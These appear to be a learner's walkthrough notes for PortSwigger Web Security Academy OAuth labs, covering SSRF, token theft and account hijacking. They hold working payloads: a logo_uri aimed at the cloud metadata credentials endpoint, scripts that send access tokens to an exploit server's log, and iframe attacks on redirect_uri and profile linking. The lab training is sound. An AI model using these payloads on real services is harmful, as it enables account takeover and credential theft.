****SSRF via OpenID dynamic client registration****

From <https://0a5b00e903024b3b81b26630002800c1.web-security-academy.net/> 

While proxying traffic through Burp, log in to your own account. Browse to https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg. 

From <https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration> 

```
https://oauth-0aa50028039e4b6581d06497024700c2.oauth-server.net/.well-known/openid-configuration
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7da52113-e2fa-47d9-bb1e-0f53419082cb)



create a suitable POST request to register your own client application with the OAuth service. You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example: 

From <https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration> 

```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a102215d-a339-4d18-a6ec-5349097ae296)




Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id. 

From <https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/32beb379-0a9c-4296-ad66-df2abf635e70)




Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from /client/CLIENT-ID/logo. We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater. 

From <https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a430637a-ba2a-47b8-add5-005e6eefbed7)




Collaborator portion 
Add collaborator as the logo uri
Copy client ID
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3bdfd9e9-5350-4d09-a019-e156ae450b71)


Add to the /reg 
poll
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e162e24d-c741-4eee-a619-a3db76a4c22f)


```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```

Go back and replaced with the given logo_uri that as given to us

```
"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
```

From <https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration> 
```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cda12b00-a526-42b5-83b4-693ca17561f0)





Copy client id
```
Vve5eJ1I13_KnQQ4vHnFn
```

Replace client id to logo
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/849bbef6-0c52-4902-a728-f77baed94d1a)


We got the secret access key

**Stealing OAuth access tokens via an open redirect**

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect> 

Login to see behavior 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bd525a95-2f97-403c-9fe8-b15d0b10d58d)



Clicking on a post and clicking next shows that the  path parameter use a path
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f0ccebf4-a530-4082-b9dc-ab92d507f9b1)


Open redirect found when switching parameter to example.com
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f64cc734-3dce-42cd-b832-ece431994dd7)


Since we know that there is an open redirect we can go back to our login request and investigate the following response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c60d5e05-3baf-495b-8831-b2de31351525)


We can probably do a open redirect on this and intercept oauth 
Turn on intercept and login again until you get the above response
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cb4d548c-0f7a-40b9-93a7-250ff1fc5971)



Our request 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5bd0330e-eb76-4595-a619-28c76c61902a)


```
GET /auth?client_id=vxn9jlxsyf55ruju00ocn&redirect_uri=https://0a43008e041914c5811007e300e600c7.web-security-academy.net/oauth-callback/../next?path=example.com&response_type=token&nonce=-1747867307&scope=openid%20profile%20email HTTP/2
Host: oauth-0ae700ab04661448816b055402e800c5.oauth-server.net
Cookie: _session=JyYNg3oYi-9D3s4OKTPru; _session.legacy=JyYNg3oYi-9D3s4OKTPru
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0a43008e041914c5811007e300e600c7.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```



Since we don’t have a attack server available we can use the following 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/276e528f-7bb2-48e9-a473-d5e48dc5696c)


Will open redirect you to the post 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b1f6bf4b-6dd6-4d8f-9c1b-31b97449c428)


On our exploit server
, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead: 

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect> 


```
<script> window.location = '/?'+document.location.hash.substr(1) </script>
```

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/38b792ce-428e-4a20-bfaa-39882da70a6f)




Log out and intercept the till you get a redirect uri and replace that uri with our exploit server

```
GET /auth?client_id=vxn9jlxsyf55ruju00ocn&redirect_uri=https://0a43008e041914c5811007e300e600c7.web-security-academy.net/oauth-callback/../next?path=https://0a43008e041914c5811007e300e600c7.web-security-academy.net/&response_type=token&nonce=-1747867307&scope=openid%20profile%20email HTTP/2
Host: oauth-0ae700ab04661448816b055402e800c5.oauth-server.net
Cookie: _session=JyYNg3oYi-9D3s4OKTPru; _session.legacy=JyYNg3oYi-9D3s4OKTPru
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0a43008e041914c5811007e300e600c7.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

This will just take us to that url 
What we want is the access token



```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```


```
https://oauth-0ae700ab04661448816b055402e800c5.oauth-server.net/auth?client_id=vxn9jlxsyf55ruju00ocn&redirect_uri=https://0a43008e041914c5811007e300e600c7.web-security-academy.net/oauth-callback/../next?path=https://exploit-0a2900f804c4142b819506ee011e0033.exploit-server.net/&response_type=token&nonce=454378282&scope=openid%20profile%20email
```



```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0ae700ab04661448816b055402e800c5.oauth-server.net/auth?client_id=vxn9jlxsyf55ruju00ocn&redirect_uri=https://0a43008e041914c5811007e300e600c7.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a2900f804c4142b819506ee011e0033.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```


View exploit and you should have your key in the log
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8304e20d-b34b-4bb6-b3c7-a027e26091eb)


Deliver to victim to get there access token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/48e41025-fc45-4197-a937-5ed4fe6d85ed)



• In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key. 

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect> 

```
e7fvdtEyPB-e0QwqizuQzjpIYbsWvMbdbweJEGickZG
```

From <https://exploit-0a2900f804c4142b819506ee011e0033.exploit-server.net/log> 



We now have api key
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/095b7dd7-cf1b-4854-b31c-1d9fe678d5c4)




**Stealing OAuth access tokens via a proxy page**

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page> 



Log in with burpe listening once again
Look for the auth?client request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6351f180-0960-4b00-bbdc-0884fa54736b)



Send to repeater and open burpe intruder

Change uri redirect to something arbitrary like localhost

Bad request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2fcc74a4-4f35-4c47-a7fc-1c0f253fa9ea)


Trying directory traversal method
We get 302 found
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cd2f96ed-1e3f-41be-a557-dd54896a54bb)



Open a post on the website and notice that the comment form is in a iframe on each blog post
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f992b3d9-f5e6-4e75-a601-6b678c944b6c)





Look closer at the /post/comment/comment-form page in Burp and notice that it uses the postMessage() method to send the window.location.href property to its parent window. Crucially, it allows messages to be posted to any origin (*). 

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7329deb2-9ae7-44db-93c5-485735967962)



To exploit

```
<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
```

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page> 


Go to exploit server and create an iframe in which the src attribute is the URL you just copied. Use directory traversal to change the redirect_uri so that it points to the comment form. The result should look something like this: 

From <https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page> 

```
<iframe src="https://oauth-0acc005e0468ae7982b93b95022200ad.oauth-server.net/auth?client_id=hco59og28kfxubr3a1wl9&redirect_uri=https://0a1300d00445aeac82eb3d5c004d00c3.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1215408163&scope=openid%20profile%20email"></iframe>
```

```
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/759e7d6e-5527-4b2c-89d1-cde889f7ec0c)






Iframe work

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/888c0f2e-08a1-4a29-a74c-423b41ca3d7a)




Access token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d1014dfa-bf27-4038-ab4a-81c6eab7c9b2)



```
Pd4JDS4sjcBCNiufw8Lovz6SHMfP4MW8mmObSv8fgC2
```

From <https://exploit-0aa7009504e1ae4182e33c3d01bb00a7.exploit-server.net/log> 

API key
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5e7eaea3-373c-4a26-a15f-ae1137a91cad)


**Authentication bypass via OAuth implicit flow**

Sign in with oauth
Notice that we get the following to authenticate 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4471bb25-15bd-4c25-b542-4456f68f4d0b)


Send to repeater and change parameter to get another user authentication session. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f54fea02-886c-4cf9-87d4-8fcaf8e476cc)


**Forced OAuth profile linking**

From <https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking> 


Log in like usual 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9db3879e-966d-4f84-91a4-f9d9387b775f)

Attach social media
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3f395ead-a293-4af7-a483-dd2853a88186)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/05b65936-0897-4bee-9819-8a3efc90cd9a)


We got a page with a linking code
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9a8fa953-c02b-428c-ab8c-71cfe73ce247)



To exploit 
Turn on proxy intercept and attach as social profile again
Forward until you intercept the linking code and drop the request to ensure that the code is not used and remain valid 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/13955ecd-6817-46a8-a406-408e50f8bd51)

Drop the request. This is important to ensure that the code is not used and, therefore, remains valid. 

From <https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking> 

Turn off proxy interception and log out of the blog website

From <https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking> 

Go to the exploit server and create an iframe in which the src attribute points to the URL you just copied. The result should look something like this: 

From <https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking> 


```
<iframe src="https://0a2f00d9031136728432880900c0003b.web-security-academy.net/oauth-linking?code=xZLqntP6plNwG7xpLY7cfLxxOAWDcWHD_CFiORanJ_U"></iframe>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1bff189b-cf79-42c3-9693-3b9f6ff15667)



Deliver and you should have admin panel when logged out and logged in via social profile 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6b2cc85a-1156-4548-b8f6-5929d8806888)





**OAuth account hijacking via redirect_uri**

From <https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri> 

Log in and notice the redirect  uri
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6b8fda7e-4d48-4667-919c-b5b49671dcef)

Changed the redirect uri to your exploit server
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5d28ba7e-e62a-4900-b50a-e5b1a4671cd1)


Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/02c04549-6f16-4e8f-b9e6-b16331fb0885)



• Go back to the exploit server and create the following iframe at /exploit: 
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
``` 

From <https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri> 


```
<iframe src="https://oauth-0a20007b03ddb26680b183c7028600bf.oauth-server.net/auth?client_id=k2f0bq49yngz7cvmt5x75&redirect_uri=https://exploit-0aa100d103d7b2b880ac844a0181003a.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Our exploit 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/900988cc-17d2-4afb-8078-a7a2f9a9418d)


Deliever to victim
Our exploit code
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/75b567ad-4da2-449b-b1f9-5da1e2232737)


```
https://0a0f0087038db247808e859f00c30031.web-security-academy.net/oauth-callback?code=B8UavafeF9jyTwWlEbe-7X05Jk9ybh8gNPUajniI96r
```
Entering to log in
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/24cb863e-2f69-495e-ae64-9aceac2c8173)

